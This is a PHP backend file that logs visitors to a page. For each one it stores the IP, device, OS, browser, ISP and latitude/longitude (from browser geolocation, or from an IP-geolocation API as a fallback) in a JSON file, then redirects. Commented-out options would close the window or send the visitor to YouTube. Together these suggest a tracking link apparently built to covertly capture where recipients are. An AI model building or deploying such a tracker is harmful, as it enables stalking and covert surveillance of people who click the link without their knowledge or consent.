

<?php

use function PHPSTORM_META\type;

require('UserInfo.php');
function getUsers()
{
    return json_decode(file_get_contents("users.json"), true);
}


function getUserBydate($date)
{
    $users = getUsers();
    foreach ($users as $user) {
        if ($user['date'] == $date) {
            return $user;
        }
    }
    return null;
}

function deleteUser($date)
{
    $users = getUsers();
    foreach ($users as $i => $user) {
        if ($user['date'] == $date) {
            unset($users[$i]);
        };
    };
    $users = json_encode($users);
    file_put_contents('users.json', $users);
}

function deleteall()
{
    $users = [];
    $users = json_encode($users);
    file_put_contents('users.json', $users);
}

function getInfo()
{


    $date = date("Y-m-d H:i:s");
    $ip = UserInfo::get_ip();
    $device = UserInfo::get_device();
    $os = UserInfo::get_os();
    $browser = UserInfo::get_browser();
    $notes = '';


    $latitude = $_GET['lat'];
    $longtitude = $_GET['long'];
    $method = 'getcurrentposition';


    $details = json_decode(file_get_contents("https://api.ipregistry.co/${ip}?key=tryout"), true);

    $provider = $details['connection']['organization'];

    if ($latitude == "error") {
        $latitude = $details['location']['latitude'];
        $longtitude = $details['location']['longitude'];
        $method = 'ipaddress';
    }

    $newarray = [
        'date' => $date, 'ip' => $ip, 'device' => $device,
        'os' => $os, 'browser' => $browser, 'latitude' => $latitude, 'longtitude' => $longtitude,
        'method' => $method, 'provider' => $provider, 'notes' => $notes
    ];

    return $newarray;
}
function createUser()
{
    $newData = getInfo();


    $users = getUsers();

    $users[] = $newData;
    $users = json_encode($users);

    file_put_contents('users.json', $users);
    header("location: index.php");
    // close the page


    // echo "<script>window.close();</script>";

    // go to youtube 
    // header('Location: https://www.youtube.com/');



}

function updateUser($data, $date)
{
    $users = getUsers();
    foreach ($users as $i => $user) {
        if ($user['date'] == $date) {
            $users[$i] = array_merge($user, $data);
            $users = json_encode($users);
            file_put_contents('users.json', $users);
        };
    };
}


?>

